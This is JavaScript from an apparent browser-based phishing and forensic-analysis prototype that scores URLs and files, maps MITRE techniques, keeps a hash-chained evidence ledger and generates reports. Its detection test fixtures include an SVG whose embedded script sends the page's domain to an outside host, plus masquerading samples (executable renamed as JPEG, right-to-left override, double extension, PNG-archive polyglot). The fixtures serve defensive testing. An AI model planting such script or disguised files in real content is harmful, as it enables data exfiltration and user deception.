  if(res.error){ $('#phishResult').innerHTML=`<div class="card"><div class="card__body"><div class="note note--warn">${esc(res.error)}</div></div></div>`; return; }
  const featHTML=res.feats.map(f=>`<div class="kv__k">${esc(f.k)}</div>
    <div class="kv__v mono" style="${f.flag?'color:#E88C87':''}">${esc(f.v)}${f.flag?' <span class="pill pill--high" style="margin-left:6px">FLAG</span>':''}</div>`).join('');
  const extra = res.kind==='url' ? `
    ${res.brand?`<div class="note mt"><b>Brand referenced:</b> ${esc(res.brand.name)}. The legitimate domain is <span class="mono">${esc(res.brand.domain)}</span>; this link resolves to <span class="mono">${esc(res.reg)}</span>.</div>`:''}
    ${res.ioc?`<div class="note note--crit mt"><b>Indicator match.</b> ${esc(res.ioc.ind)} is recorded against campaign ${esc(res.ioc.campaign)}, first seen ${esc(res.ioc.first)}, ${res.ioc.sight} sightings. <span class="pill pill--sim">Seeded dataset</span></div>`:''}`
    : `${res.urls&&res.urls.length?`<div class="eyebrow" style="margin-top:14px">Links in body (${res.urls.length})</div>${res.urls.slice(0,6).map(u=>`<div class="small mono muted" style="word-break:break-all">${esc(u)}</div>`).join('')}`:''}
       ${res.attachments&&res.attachments.length?`<div class="eyebrow" style="margin-top:14px">Attachments</div>${res.attachments.map(a=>`<div class="small mono">${esc(a.replace(/\u202E/g,'⟪U+202E⟫'))}</div>`).join('')}`:''}`;
  $('#phishResult').innerHTML=renderScoreCard(res)+`
    <div class="card mt"><div class="card__head"><div class="card__title">${res.kind==='url'?'Extracted features':'Header inspection'}</div>
      <div class="card__hint">${res.kind==='url'?'Lexical + infrastructure':'RFC 5322'}</div></div>
      <div class="card__body"><div class="kv">${featHTML}</div>${extra}</div></div>`;
  logVerdict(res);
  if(res.band.key==='crit'||res.band.key==='high') escalate(res);
}

/* ==================================================================
   THREAT INTEL
   ================================================================== */
function paintIoc(){
  $('#iocCount').textContent=IOC_DB.length+' records';
  $('#tblIoc tbody').innerHTML=IOC_DB.map(i=>`<tr data-ioc="${esc(i.ind)}">
    <td class="mono xsmall">${esc(i.ind)}</td><td class="xsmall">${i.type}</td>
    <td><span class="pill ${i.rep==='malicious'?'pill--crit':'pill--susp'}">${i.rep}</span></td>
    <td class="xsmall mono">${esc(i.campaign)}</td><td class="mono xsmall faint">${i.first}</td>
    <td class="tbl__num">${i.sight}</td></tr>`).join('');
  $$('#tblIoc tbody tr').forEach(tr=>tr.onclick=()=>{ $('#iocIn').value=tr.dataset.ioc; searchIoc(); });
}
function searchIoc(){
  const q=$('#iocIn').value.trim().toLowerCase();
  if(!q){ $('#iocResult').innerHTML=''; return; }
  let key=q; try{ if(q.startsWith('http')) key=new URL(q).hostname; }catch(e){}
  const hit=IOC_DB.find(i=>i.ind.toLowerCase()===key||i.ind.toLowerCase()===registrable(key));
  const evHit=State.evidence.find(e=>e.hash===q);
  if(!hit&&!evHit){
    $('#iocResult').innerHTML=`<div class="card"><div class="card__body">
      <span class="pill pill--unk"><span class="pill__dot"></span>UNKNOWN</span>
      <p class="mt-s small" style="margin-top:10px">No record for <span class="mono">${esc(q)}</span> in the local dataset.</p>
      <div class="note note--warn mt"><b>Unknown is not safe.</b> Absence from this dataset means the indicator has not been observed here - not that it is benign.</div>
    </div></div>`; return;
  }
  if(evHit&&!hit){
    $('#iocResult').innerHTML=`<div class="card"><div class="card__body">
      <span class="pill pill--det">LOCAL EVIDENCE MATCH</span>
      <div class="kv mt" style="margin-top:12px"><div class="kv__k">Evidence</div><div class="kv__v mono">${esc(evHit.id)} - ${esc(evHit.name)}</div>
      <div class="kv__k">Acquired</div><div class="kv__v mono">${esc(evHit.acquired)}</div></div></div></div>`; return;
  }
  const related=IOC_DB.filter(i=>i.campaign===hit.campaign&&i.ind!==hit.ind);
  $('#iocResult').innerHTML=`<div class="grid g21">
    <div class="card"><div class="card__head"><div class="card__title">${esc(hit.ind)}</div>
      <div class="card__hint"><span class="pill ${hit.rep==='malicious'?'pill--crit':'pill--susp'}">${hit.rep}</span></div></div>
      <div class="card__body"><div class="kv">
        <div class="kv__k">Type</div><div class="kv__v">${hit.type}</div>
        <div class="kv__k">Campaign</div><div class="kv__v mono">${esc(hit.campaign)}</div>
        <div class="kv__k">First seen</div><div class="kv__v mono">${hit.first}</div>
        <div class="kv__k">Sightings</div><div class="kv__v mono">${hit.sight}</div>
        <div class="kv__k">Assessment</div><div class="kv__v">${esc(hit.note)}</div>
      </div></div></div>
    <div class="card"><div class="card__head"><div class="card__title">Related indicators</div></div>
      <div class="card__body">${related.length?related.map(r=>`<div class="ind"><div class="ind__body">
        <div class="ind__name mono">${esc(r.ind)}</div><div class="ind__ev">${r.type} · ${r.sight} sightings</div></div>
        <span class="pill ${r.rep==='malicious'?'pill--crit':'pill--susp'}">${r.rep}</span></div>`).join('')
        :'<p class="small muted">No other indicators share this campaign.</p>'}</div></div></div>`;
}

/* ==================================================================
   INVESTIGATION - timeline + attack graph
   ================================================================== */
function attackGraph(){
  const N=[
    {id:'victim',l:'Victim',x:70,y:60,c:'#4C8DFF'},
    {id:'msg',l:'Email',x:210,y:60,c:'#4C8DFF'},
    {id:'url',l:'URL',x:350,y:35,c:'#D6A029'},
    {id:'dom',l:'Domain',x:490,y:35,c:'#D9534F'},
    {id:'ip',l:'IP',x:630,y:35,c:'#D9534F'},
    {id:'file',l:'File',x:350,y:130,c:'#D6A029'},
    {id:'hash',l:'SHA-256',x:490,y:130,c:'#C4453F'},
    {id:'ep',l:'Endpoint',x:210,y:200,c:'#4C8DFF'},
    {id:'evid',l:'Evidence',x:490,y:225,c:'#4CAF6A'},
    {id:'ledger',l:'Ledger',x:630,y:225,c:'#4CAF6A'},
    {id:'tech',l:'T1566.001',x:350,y:290,c:'#4C8DFF'},
    {id:'tech2',l:'T1036.007',x:210,y:290,c:'#4C8DFF'},
  ];
  const E=[['victim','msg'],['msg','url'],['url','dom'],['dom','ip'],['msg','file'],['file','hash'],
           ['victim','ep'],['file','ep'],['hash','evid'],['evid','ledger'],['msg','tech'],['file','tech2']];
  const pos=Object.fromEntries(N.map(n=>[n.id,n]));
  return `<svg class="graph" viewBox="0 0 720 340" preserveAspectRatio="xMidYMid meet">
    <defs><marker id="ar" viewBox="0 0 10 10" refX="18" refY="5" markerWidth="5" markerHeight="5" orient="auto">
      <path d="M0 0 10 5 0 10z" fill="#3D3420"/></marker></defs>
    ${E.map(([a,b])=>`<line x1="${pos[a].x}" y1="${pos[a].y}" x2="${pos[b].x}" y2="${pos[b].y}" stroke="#3D3420" stroke-width="1.2" marker-end="url(#ar)"/>`).join('')}
    ${N.map(n=>`<g class="gnode"><circle cx="${n.x}" cy="${n.y}" r="6.5" fill="${n.c}" stroke="#0B1017" stroke-width="2"/>
      <text x="${n.x}" y="${n.y-13}" text-anchor="middle">${esc(n.l)}</text></g>`).join('')}
  </svg>`;
}
function paintInvest(){
  const inc=State.incidents[0];
  if(!inc){ $('#investBody').innerHTML=`<div class="card"><div class="empty">
    <div class="empty__t">No open incident</div><div class="empty__s">An incident is created automatically when an artifact scores 50 or above.</div></div></div>`; return; }
  const MITRE=[
    {id:'T1566.001',n:'Phishing: Spearphishing Attachment',ev:'Deceptive attachment delivered by email',src:'Gateway analysis',conf:'High'},
    {id:'T1566.002',n:'Phishing: Spearphishing Link',ev:'Lookalike domain in message body',src:'URL analysis',conf:'High'},
    {id:'T1036.007',n:'Masquerading: Double File Extension',ev:'Filename and signature disagree',src:'Identity cross-validation',conf:'High'},
    {id:'T1204.002',n:'User Execution: Malicious File',ev:'Recipient opened the attachment',src:'Reported by user',conf:'Moderate'},
  ].filter(t=>{
    if(t.id==='T1036.007') return inc.res.inds&&inc.res.inds.some(i=>['MAGIC_EXEC','DBLEXT','RTLO','MIME_MISMATCH'].includes(i.id));
    if(t.id==='T1566.002') return inc.res.kind!=='file';
    if(t.id==='T1566.001') return inc.res.kind==='file';
    return true;
  });
  $('#investBody').innerHTML=`
  <div class="grid g21">
    <div class="card"><div class="card__head"><div class="card__title">${esc(inc.id)} - ${esc(inc.title)}</div>
      <div class="card__hint"><span class="pill ${inc.res.band.cls}">${esc(inc.severity)}</span></div></div>
      <div class="card__body"><div class="kv">
        <div class="kv__k">Detected</div><div class="kv__v mono">${esc(inc.detected)}</div>
        <div class="kv__k">Risk score</div><div class="kv__v mono">${inc.score}/100</div>
        <div class="kv__k">Affected asset</div><div class="kv__v mono">${esc(inc.asset)}</div>
        <div class="kv__k">Recipient</div><div class="kv__v mono">${esc(inc.victim)}</div>
        <div class="kv__k">Evidence</div><div class="kv__v mono">${inc.evidence.join(', ')}</div>
        <div class="kv__k">Investigator</div><div class="kv__v">${esc(inc.investigator)}</div>
        <div class="kv__k">Status</div><div class="kv__v"><span class="pill pill--high">${inc.status}</span></div>
      </div></div></div>
    <div class="card"><div class="card__head"><div class="card__title">Reconstructed timeline</div></div>
      <div class="card__body"><div class="tl">${State.timeline.map(e=>`<div class="tlev tlev--${e.kind}">
        <div class="tlev__t">${e.t}</div><div class="tlev__d">${esc(e.d)}</div>
        ${e.meta?`<div class="tlev__m">${esc(e.meta)}</div>`:''}</div>`).join('')}</div></div></div>
  </div>
  <div class="card mt"><div class="card__head"><div class="card__title">Attack graph</div>
    <div class="card__hint">Entity relationships</div></div><div class="card__body">${attackGraph()}</div></div>
  <div class="card mt"><div class="card__head"><div class="card__title">MITRE ATT&amp;CK mapping</div>
    <div class="card__hint">Evidence-backed only</div></div>
    <div class="card__body card__body--flush"><table class="tbl">
      <thead><tr><th>Technique</th><th>Name</th><th>Supporting evidence</th><th>Detection source</th><th>Confidence</th></tr></thead>
      <tbody>${MITRE.map(t=>`<tr><td class="mono">${t.id}</td><td>${esc(t.n)}</td><td class="xsmall muted">${esc(t.ev)}</td>
        <td class="xsmall">${esc(t.src)}</td><td><span class="pill ${t.conf==='High'?'pill--det':'pill--heu'}">${t.conf}</span></td></tr>`).join('')}</tbody>
    </table></div></div>`;
}

/* ==================================================================
   EVIDENCE + CHAIN
   ================================================================== */
function paintEvidence(){
  $('#evCount').textContent=State.evidence.length+' item'+(State.evidence.length===1?'':'s');
  $('#tblEvidence tbody').innerHTML=State.evidence.length?State.evidence.map(e=>`<tr data-ev="${e.id}">
    <td class="mono">${e.id}</td><td class="mono xsmall" style="max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(e.name)}</td>
    <td class="mono xsmall faint">${e.hash.slice(0,20)}…</td><td class="mono xsmall">${e.acquired}</td>
    <td class="xsmall">${esc(e.custodian)}</td>
    <td><span class="pill ${e.integrity==='verified'?'pill--safe':'pill--crit'}">${e.integrity==='verified'?'VERIFIED':'MISMATCH'}</span></td></tr>`).join('')
    :`<tr><td colspan="6"><div class="empty"><div class="empty__t">Vault is empty</div>
      <div class="empty__s">Evidence is registered automatically when an artifact is classified high risk or above.</div></div></td></tr>`;
  $$('#tblEvidence tbody tr').forEach(tr=>tr.onclick=()=>showEvidence(tr.dataset.ev));
  const sel=$('#verifySel');
  sel.innerHTML=State.evidence.map(e=>`<option value="${e.id}">${e.id} - ${esc(e.name)}</option>`).join('')
    ||'<option value="">No evidence registered</option>';
}
function showEvidence(id){
  const e=State.evidence.find(x=>x.id===id); if(!e) return;
  const blk=Ledger.recordFor(id);
  $('#evDetail').innerHTML=`<div class="grid g2">
    <div class="card"><div class="card__head"><div class="card__title">${e.id}</div>
      <div class="card__hint"><span class="pill ${e.integrity==='verified'?'pill--safe':'pill--crit'}">${e.integrity==='verified'?'INTEGRITY VERIFIED':'INTEGRITY MISMATCH'}</span></div></div>
      <div class="card__body"><div class="kv">
        <div class="kv__k">Artifact</div><div class="kv__v mono">${esc(e.name)}</div>
        <div class="kv__k">Type</div><div class="kv__v">${esc(e.type)}</div>
        <div class="kv__k">Size</div><div class="kv__v">${fmtBytes(e.size)}</div>
        <div class="kv__k">Acquired</div><div class="kv__v mono">${esc(e.acquired)}</div>
        <div class="kv__k">Source</div><div class="kv__v">${esc(e.source)}</div>
        <div class="kv__k">Custodian</div><div class="kv__v">${esc(e.custodian)}</div>
        <div class="kv__k">Ledger block</div><div class="kv__v mono">${blk?'#'+blk.index:'-'}</div>
      </div>
      <div class="hstrip" style="margin-top:14px"><div class="hstrip__lbl">Registered SHA-256</div>${hashStrip(e.hash)}</div>
    </div></div>
    <div class="card"><div class="card__head"><div class="card__title">Chain of custody</div>
      <div class="card__hint">${e.custody.length} events</div></div>
      <div class="card__body"><div class="tl">${e.custody.map(c=>`<div class="tlev tlev--${c.action.includes('TAMPER')?'crit':'ok'}">
        <div class="tlev__t">${c.ts}</div><div class="tlev__d">${esc(c.action.replace(/_/g,' '))}</div>
        <div class="tlev__m">${esc(c.actor)} - ${esc(c.note)}</div></div>`).join('')}</div></div></div>
  </div>`;
  $('#evDetail').scrollIntoView({behavior:'smooth',block:'nearest'});
}
function paintChain(){
  $('#chainView').innerHTML=Ledger.blocks.length?Ledger.blocks.map(b=>`<div class="blk">
    <div class="blk__h"><span class="blk__n">BLOCK #${b.index}</span>
      <span class="mono xsmall faint">${b.ts}</span>
      <span class="blk__ok pill pill--safe">LINKED</span></div>
    <div class="kv" style="font-size:11.5px">
      <div class="kv__k">Action</div><div class="kv__v mono">${esc(b.action)}</div>
      <div class="kv__k">Evidence</div><div class="kv__v mono">${esc(b.evidenceId)}</div>
      <div class="kv__k">Payload hash</div><div class="kv__v mono xsmall">${b.payloadHash}</div>
      <div class="kv__k">Prev hash</div><div class="kv__v mono xsmall faint">${b.prev}</div>
      <div class="kv__k">Block hash</div><div class="kv__v mono xsmall" style="color:var(--accent)">${b.hash}</div>
      <div class="kv__k">Actor</div><div class="kv__v">${esc(b.actor)}</div>
    </div></div>`).join('')
    :'<div class="empty"><div class="empty__t">Ledger not initialised</div><div class="empty__s">The genesis block is written when the first evidence item is registered.</div></div>';
}

;

"use strict";

/* ==================================================================
   INTEGRITY VERIFICATION + CONTROLLED TAMPERING
   ================================================================== */
async function currentHashOf(e){
  if(e.tampered) return e.tamperedHash;
  return e.hash;
}
async function doVerify(){
  const id=$('#verifySel').value;
  const e=State.evidence.find(x=>x.id===id);
  if(!e){ $('#verifyOut').innerHTML=`<div class="card"><div class="card__body">
    <div class="note note--warn">No evidence registered yet. Run the guided demo, or scan a high-risk file first.</div></div></div>`; return; }
  const blk=Ledger.recordFor(e.id);
  const recorded=blk?blk.payloadHash:e.hash;
  const current=await currentHashOf(e);
  const ok=recorded===current;
  const chainOK=await Ledger.validate();
  e.integrity=ok?'verified':'mismatch';
  e.custody.push({ts:nowISO(),actor:'R. Kannan',action:ok?'INTEGRITY_VERIFIED':'INTEGRITY_MISMATCH',
    note:ok?'Recomputed fingerprint matches ledger block #'+(blk?blk.index:'-'):'Recomputed fingerprint diverges from ledger block #'+(blk?blk.index:'-')});
  let firstDiff=-1;
  for(let i=0;i<64;i+=2) if(recorded.slice(i,i+2)!==current.slice(i,i+2)){ firstDiff=i/2; break; }

  $('#verifyOut').innerHTML=`<div class="card">
    <div class="card__head"><div class="card__title">Verification result - ${esc(e.id)}</div>
      <div class="card__hint"><span class="pill ${ok?'pill--safe':'pill--crit'}"><span class="pill__dot"></span>${ok?'INTEGRITY VERIFIED':'INTEGRITY MISMATCH'}</span></div></div>
    <div class="card__body">
      <div class="hstrip"><div class="hstrip__lbl">Recorded in ledger - block #${blk?blk.index:'-'} at ${blk?blk.ts:'-'}</div>${hashStrip(recorded)}</div>
      <div class="hstrip" style="margin-top:16px"><div class="hstrip__lbl">Recomputed from the artifact as it exists now</div>${hashStrip(current,recorded)}</div>
      <div class="note ${ok?'':'note--crit'} mt" style="margin-top:18px">
        ${ok
          ? `<b>The artifact is unchanged.</b> The fingerprint recomputed just now is identical to the one committed to the ledger at ${blk?blk.ts:'registration'}. Nothing has been altered since.`
          : `<b>The artifact no longer matches the fingerprint recorded when it was registered.</b> The first divergence is at byte ${firstDiff} of the digest. The ledger entry cannot be edited to hide this, because every later block commits to the hash of the one before it.`}
      </div>
      <div class="kv mt" style="margin-top:16px">
        <div class="kv__k">Ledger structure</div><div class="kv__v">${chainOK.ok
          ? '<span class="pill pill--safe">INTACT</span> <span class="small muted">All '+Ledger.blocks.length+' blocks link correctly</span>'
          : '<span class="pill pill--crit">BROKEN AT BLOCK '+chainOK.at+'</span> <span class="small muted">'+esc(chainOK.why)+'</span>'}</div>
        <div class="kv__k">Artifact state</div><div class="kv__v">${e.tampered?'<span class="pill pill--crit">MODIFIED IN SESSION</span>':'<span class="pill pill--safe">ORIGINAL</span>'}</div>
      </div>
    </div></div>`;
  paintEvidence(); paintCommand();
  toast(ok?'Integrity verified - '+e.id:'Integrity mismatch - '+e.id, ok?'ok':'crit');
}
async function doTamper(){
  const id=$('#verifySel').value;
  const e=State.evidence.find(x=>x.id===id);
  if(!e){ toast('Register evidence before tampering with it'); return; }
  e.tampered=true;
  e.tamperedHash=await sha256Text(e.hash+'|modified-in-controlled-demo|'+Date.now());
  e.custody.push({ts:nowISO(),actor:'unknown process',action:'ARTIFACT_MODIFIED',
    note:'Stored copy altered outside the custody workflow (controlled demonstration)'});
  toast('Evidence bytes modified. Ledger untouched - now verify.','crit');
  doVerify();
}
async function doRestore(){
  const id=$('#verifySel').value;
  const e=State.evidence.find(x=>x.id===id);
  if(!e) return;
  e.tampered=false; delete e.tamperedHash;
  e.custody.push({ts:nowISO(),actor:'R. Kannan',action:'ARTIFACT_RESTORED',note:'Original bytes reinstated from the working copy'});
  toast('Original restored','ok'); doVerify();
}

/* ==================================================================
   RESPONSE
   ================================================================== */
function paintResponse(){
  if(!State.responses.length){ $('#responseBody').innerHTML=`<div class="card"><div class="empty">
    <div class="empty__t">No recommendations pending</div>
    <div class="empty__s">Recommendations are generated when an incident is created.</div></div></div>`; return; }
  const inc=State.incidents[0];
  $('#responseBody').innerHTML=`
  <div class="note note--warn">
    <b>Enforcement in this prototype is simulated.</b> World Monitor has no endpoint agent or mail-gateway integration.
    The analysis, the decision, and the prioritisation are real; the action is not carried out.
  </div>
  <div class="card mt"><div class="card__head"><div class="card__title">Recommended actions - ${esc(inc.id)}</div>
    <div class="card__hint">Ordered by containment value</div></div>
    <div class="card__body card__body--flush"><table class="tbl">
      <thead><tr><th>Action</th><th>Status</th><th>Rationale</th><th>Enforcement</th></tr></thead>
      <tbody>${State.responses.map((a,i)=>`<tr>
        <td>${esc(a.a)}</td>
        <td><span class="pill ${a.s==='Completed'?'pill--safe':a.s==='Pending approval'?'pill--susp':'pill--det'}">${esc(a.s)}</span></td>
        <td class="xsmall muted">${esc(a.n)}</td>
        <td>${a.s==='Completed'?'<span class="pill pill--safe">Real</span>':'<span class="pill pill--sim">Simulated</span>'}</td>
      </tr>`).join('')}</tbody></table></div></div>`;
}

/* ==================================================================
   REPORT
   ================================================================== */
function paintReport(){
  const inc=State.incidents[0];
  if(!inc){ $('#reportBody').innerHTML=`<div class="empty"><div class="empty__t">Nothing to report</div>
    <div class="empty__s">A report is generated from an open incident and its registered evidence.</div></div>`; return; }
  const r=inc.res, e=State.evidence.find(x=>inc.evidence.includes(x.id));
  const blk=e?Ledger.recordFor(e.id):null;
  $('#reportBody').innerHTML=`<div class="rpt">
    <h1>Digital Forensic Investigation Report</h1>
    <div class="rptmeta">World Monitor, ${esc(inc.id)}, generated ${nowISO()}, investigator ${esc(inc.investigator)}</div>

    <h2>1. Summary</h2>
    <p>An artifact delivered to <code>${esc(inc.victim)}</code> was assessed by the World Monitor analysis gateway and
    classified <strong>${esc(inc.severity)}</strong> with a risk score of <strong>${inc.score}/100</strong>.
    ${r.inds.length} indicator${r.inds.length===1?'':'s'} contributed to that score, of which
    ${r.inds.filter(i=>i.tier==='det').length} ${r.inds.filter(i=>i.tier==='det').length===1?'is':'are'} deterministic -
    established from the bytes themselves rather than inferred.</p>

    <h2>2. Artifact</h2>
    <table><tr><th>Name</th><td><code>${esc(r.kind==='file'?r.name:r.target)}</code></td></tr>
    ${r.kind==='file'?`<tr><th>Declared type</th><td>${esc(r.declaredMime)} (.${esc(r.ext)})</td></tr>
    <tr><th>Detected type</th><td><strong>${esc(r.detected.type)}</strong></td></tr>
    <tr><th>Size</th><td>${fmtBytes(r.size)}</td></tr>
    <tr><th>Entropy</th><td>${r.entropy.toFixed(3)} bits/byte</td></tr>`:''}
    <tr><th>SHA-256</th><td><code>${e?e.hash:r.hash||'-'}</code></td></tr></table>

    <h2>3. Findings</h2>
    <table><thead><tr><th>Indicator</th><th>Tier</th><th>Weight</th><th>Evidence</th></tr></thead><tbody>
    ${[...r.inds].sort((a,b)=>b.pts-a.pts).map(i=>`<tr><td>${esc(i.label)}</td><td>${TIER_NAME[i.tier]}</td>
      <td>+${i.pts}</td><td><code>${esc(i.ev)}</code></td></tr>`).join('')}
    </tbody></table>
    <p><em>Score = sum of indicator weights, capped at 100. Deterministic indicators are byte-level facts.
    Heuristic and statistical indicators raise suspicion and never establish a malicious verdict alone.</em></p>

    <h2>4. Evidence and provenance</h2>
    ${e?`<table>
      <tr><th>Evidence ID</th><td><code>${esc(e.id)}</code></td></tr>
      <tr><th>Acquired</th><td>${esc(e.acquired)}</td></tr>
      <tr><th>Custodian</th><td>${esc(e.custodian)}</td></tr>
      <tr><th>Ledger block</th><td>#${blk?blk.index:'-'} committed ${blk?blk.ts:'-'}</td></tr>
      <tr><th>Block hash</th><td><code>${blk?blk.hash:'-'}</code></td></tr>
      <tr><th>Integrity at time of report</th><td><strong>${e.integrity==='verified'?'VERIFIED':'MISMATCH'}</strong></td></tr>
    </table>
    <p>The fingerprint was committed to an append-only ledger at registration. Each block commits to the hash of its
    predecessor, so an entry cannot be revised after the fact without breaking every block that follows it.</p>`
    :'<p>No evidence item registered.</p>'}

    <h2>5. Timeline</h2>
    <ul>${State.timeline.map(t=>`<li><code>${t.t}</code> - ${esc(t.d)}${t.meta?' <em>('+esc(t.meta)+')</em>':''}</li>`).join('')}</ul>

    <h2>6. Recommended actions</h2>
    <ul>${State.responses.map(a=>`<li><strong>${esc(a.a)}</strong> - ${esc(a.n)} <em>[${esc(a.s)}]</em></li>`).join('')}</ul>

    <h2>7. Limitations</h2>
    <ul>
      <li>Analysis was static. No dynamic execution or sandbox detonation was performed.</li>
      <li>Enforcement actions are simulated; no endpoint or gateway agent is connected.</li>
      <li>Threat intelligence was drawn from a seeded local dataset, not a live feed.</li>
      <li>Absence of a match means the artifact is unknown to this dataset, not that it is benign.</li>
      ${r.stego&&r.stego.flag?'<li>Statistical indicators consistent with hidden data were observed. Hidden data is inert without a separate extraction program and does not by itself establish malice.</li>':''}
    </ul>
    <p class="rptmeta" style="margin-top:22px">End of report, ${esc(inc.id)}</p>
  </div>`;
}

/* ==================================================================
   TEST FIXTURES - inert header patterns, no executable code
   ================================================================== */
function u8(...a){ return new Uint8Array(a); }
function concat(arrs){
  const n=arrs.reduce((a,x)=>a+x.length,0), out=new Uint8Array(n);
  let o=0; for(const a of arrs){ out.set(a,o); o+=a.length; }
  return out;
}
function minimalJPEG(size=9000){
  const head=u8(0xFF,0xD8,0xFF,0xE0,0x00,0x10,0x4A,0x46,0x49,0x46,0x00,0x01,0x01,0x00,0x00,0x01,0x00,0x01,0x00,0x00);
  const sos=u8(0xFF,0xDA,0x00,0x08,0x01,0x01,0x00,0x00,0x3F,0x00);
  const body=new Uint8Array(size);
  for(let i=0;i<body.length;i++) body[i]=(Math.sin(i/7)*40+120+((i*31)%23))&0xFF;
  return concat([head,sos,body,u8(0xFF,0xD9)]);
}
const FIXTURES=[
  {name:'statement.jpg', label:'Executable renamed as a photo', build(){
    const stub=new TextEncoder().encode('This program cannot be run in DOS mode.');
    const pad1=new Uint8Array(64); pad1[0]=0x90;
    const tail=new Uint8Array(6000);
    for(let i=0;i<tail.length;i++) tail[i]=(i*97)&0xFF;
    return new File([concat([u8(0x4D,0x5A,0x90,0x00,0x03,0x00,0x00,0x00),pad1,stub,u8(0x50,0x45,0x00,0x00),tail])],
      'statement.jpg',{type:'image/jpeg'});
  }},
  {name:'holiday.jpg', label:'Clean photo - honest false positive', build(){
    return new File([minimalJPEG(14000)],'holiday.jpg',{type:'image/jpeg'});
  }},
  {name:'receipt\u202Egpj.exe', label:'Right-to-left override', build(){
    return new File([minimalJPEG(5000)],'receipt\u202Egpj.exe',{type:'image/jpeg'});
  }},
  {name:'invoice.pdf.exe', label:'Double extension', build(){
    return new File([minimalJPEG(4000)],'invoice.pdf.exe',{type:'application/pdf'});
  }},
  {name:'logo.svg', label:'SVG carrying script', build(){
    const s=`<?xml version="1.0"?>\n<svg xmlns="http://www.w3.org/2000/svg" width="120" height="120">\n`+
            `  <circle cx="60" cy="60" r="50" fill="#4C8DFF"/>\n`+
            `  <scr`+`ipt>fetch('https://update-cdn.click/c?d='+document.domain)<\/scr`+`ipt>\n`+
            `</svg>`;
    return new File([s],'logo.svg',{type:'image/svg+xml'});
  }},
  {name:'poster.png', label:'Polyglot - PNG with archive appended', build(){
    const png=concat([
      u8(0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A),
      u8(0,0,0,13,0x49,0x48,0x44,0x52,0,0,0,64,0,0,0,64,8,2,0,0,0),
      u8(0,0,0,0),
      u8(0,0,0,0,0x49,0x45,0x4E,0x44,0xAE,0x42,0x60,0x82)
    ]);
    const zipName=new TextEncoder().encode('payload.exe');
    const zip=concat([u8(0x50,0x4B,0x03,0x04,0x14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
      0x10,0x27,0,0,0, 0x10,0x27,0,0,0, zipName.length,0,0,0), zipName, new Uint8Array(400)]);
    return new File([concat([png,zip])],'poster.png',{type:'image/png'});
  }},
];

;

"use strict";

/* ==================================================================
   FILE EXPLORER - real Downloads folder access + World Monitor auto-quarantine
   ================================================================== */

const AUTO_DELETE_NAMES = ['salary-slip.txt','travel-itinerary.txt'];

const FX_LIBRARY=[
  {id:'fx1', name:'goa-sunset.png',      kind:'image', w:640,h:420, desc:'Beach sunset', pal:['#D6A029','#D9534F','#2a1a3e']},
  {id:'fx2', name:'family-trip.png',     kind:'image', w:640,h:420, desc:'Hill station', pal:['#8ec5fc','#C4CAD3','#3a5a7a']},
  {id:'fx3', name:'birthday-cake.png',    kind:'image', w:640,h:420, desc:'Celebration', pal:['#D6A029','#D6A029','#7a3b3b']},
  {id:'fx4', name:'office-team.png',      kind:'image', w:640,h:420, desc:'Team photo', pal:['#5ee7df','#8A929C','#233a5c']},
  {id:'fx5', name:'passport-copy.png',    kind:'image', w:640,h:420, desc:'Scanned document', pal:['#d9e4ec','#9BA3AE','#3d4a56']},
  {id:'fx6', name:'salary-slip.txt',     kind:'doc',   desc:'Payslip export', ext:'txt'},
  {id:'fx7', name:'travel-itinerary.txt',kind:'doc',   desc:'Trip plan', ext:'txt'},
];
const FX_CACHE={};

let _dirHandle = null;
let _liveFiles = [];
let _inputFiles = [];
let _mode = 'demo';
let _canDelete = false;
let _watchTimer = null;
let _monSeq = 0;

function fxIconSVG(kind){
  return kind==='doc'
    ? '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><path d="M14 2v6h6M8 13h8M8 17h5"/></svg>'
    : '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><rect x="3" y="4" width="18" height="16" rx="2"/><circle cx="9" cy="10" r="2"/><path d="m21 16-5.5-5.5L4 21"/></svg>';
}

function renderPhotoBlob(item){
  return new Promise(resolve=>{
    const c=document.createElement('canvas'); c.width=item.w; c.height=item.h;
    const ctx=c.getContext('2d');
    const g=ctx.createLinearGradient(0,0,item.w,item.h);
    g.addColorStop(0,item.pal[0]); g.addColorStop(.55,item.pal[1]); g.addColorStop(1,item.pal[2]);
    ctx.fillStyle=g; ctx.fillRect(0,0,item.w,item.h);
    for(let i=0;i<6;i++){
      ctx.beginPath();
      const rx=Math.random()*item.w, ry=Math.random()*item.h, rr=40+Math.random()*90;
      ctx.fillStyle='rgba(255,255,255,'+(0.05+Math.random()*0.09).toFixed(2)+')';
      ctx.arc(rx,ry,rr,0,Math.PI*2); ctx.fill();
    }
    ctx.fillStyle='rgba(0,0,0,.35)'; ctx.fillRect(0,item.h-46,item.w,46);
    ctx.fillStyle='#fff'; ctx.font='600 20px sans-serif'; ctx.fillText(item.desc,16,item.h-16);
    c.toBlob(blob=>{ resolve({blob,dataUrl:c.toDataURL('image/png')}); },'image/png');
  });
}
function renderDocBlob(item){
  const body =
`World Monitor DEMO LIBRARY
File: ${item.name}
Description: ${item.desc}
Generated: ${nowISO()}

This is an ordinary, harmless text file created locally in your browser
to demonstrate the File Explorer. It contains no macros, no scripts,
and no executable content of any kind.

------------------------------------------------------------
Reference number: ${Math.random().toString(36).slice(2,10).toUpperCase()}
------------------------------------------------------------
`;
  const blob=new Blob([body],{type:'text/plain'});
  return Promise.resolve({blob,dataUrl:null});
}
async function getFxAsset(item){
  if(FX_CACHE[item.id]) return FX_CACHE[item.id];
  const {blob,dataUrl}= item.kind==='image' ? await renderPhotoBlob(item) : await renderDocBlob(item);
  const buf=await blob.arrayBuffer();
  const hash=await sha256(buf);
  const asset={blob,dataUrl,hash,size:blob.size};
  FX_CACHE[item.id]=asset;
  return asset;
}

function renderModeBanner(){
  const el=$('#fxModeBanner');
  if(_mode==='live'){
    el.style.display='';
    el.className='note';
    el.innerHTML=`<b>Live Downloads folder connected (edit access).</b> Showing the real files from your Downloads folder. `+
      `When automated scanning is ON, <span class="mono">${AUTO_DELETE_NAMES.join('</span> and <span class="mono">')}</span> `+
      `are deleted from your Downloads folder on disk when detected.`;
  } else if(_mode==='input'){
    el.style.display='';
    el.className='note';
